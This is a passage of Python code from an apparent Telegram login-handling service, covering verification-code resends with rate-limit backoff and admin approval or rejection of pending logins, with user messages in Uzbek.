                # Keep the adaptive local backoff as a floor as well.
                adaptive = min(300, 20 * (2 ** max(0, session.resend_count - 1)))
                effective = max(adaptive, int(server_wait or 0))
                await self.state_manager.set_resend_cooldown(user_id, effective, server_timeout=server_wait)
                next_method = meta.get("next_delivery_method")
                suffix = f". Keyingi usul: {next_method}." if next_method else "."
                return True, f"Kod {method_or_message} orqali qayta yuborildi{suffix} Keyingi urinish uchun {effective} soniya kuting."

            # A Telegram FloodWait is an exact server-provided wait.
            if server_wait:
                await self.state_manager.set_resend_cooldown(user_id, server_wait, server_timeout=server_wait)
                return False, f"Telegram cheklovi: {server_wait} soniyadan keyin qayta urinishingiz mumkin."

            # If Telegram returns PHONE_NUMBER_FLOOD without a duration, increase the
            # local backoff rather than pretending Telegram supplied an exact value.
            if meta.get("server_flood"):
                fallback = min(900, 60 * (2 ** max(0, session.resend_count - 1)))
                await self.state_manager.set_resend_cooldown(user_id, fallback)
                return False, f"Telegram ko'p kod so'ralgani uchun vaqtincha chekladi. Taxminiy xavfsiz kutish: {fallback} soniya. Bu Telegram bergan aniq muddat emas."

            if meta.get("send_code_unavailable"):
                fallback = min(300, 30 * (2 ** max(0, session.resend_count - 1)))
                await self.state_manager.set_resend_cooldown(user_id, fallback)
                return False, f"Telegram hozircha boshqa yuborish usulini bermayapti. {fallback} soniyadan keyin urinib ko'ring."

            # Network/unknown failure: keep a short backoff so a broken button cannot spam.
            fallback = min(300, 30 * (2 ** max(0, session.resend_count - 1)))
            await self.state_manager.set_resend_cooldown(user_id, fallback)
            return False, f"{method_or_message} {fallback} soniyadan keyin qayta urinib ko'ring."
        except Exception as e:
            return False, f"Qayta yuborishda xatolik: {e}"
    
    async def approve_login(self, user_id: int, admin_id: int = 0, admin_username: str = "") -> bool:
        """Atomically approve a pending login request."""
        import time
        return await self.state_manager.update_state(
            user_id,
            LoginState.COMPLETED,
            decision_admin_id=admin_id,
            decision_admin_username=admin_username or None,
            decision_at=time.time(),
        )

    async def reject_login(self, user_id: int, admin_id: int = 0, admin_username: str = "") -> bool:
        """Atomically reject a pending login request."""
        import time
        changed = await self.state_manager.update_state(
            user_id,
            LoginState.FAILED,
            decision_admin_id=admin_id,
            decision_admin_username=admin_username or None,
            decision_at=time.time(),
        )
        if changed:
            self.session_manager.cleanup_pending(user_id)
            await self.state_manager.cleanup_session(user_id)
        return changed
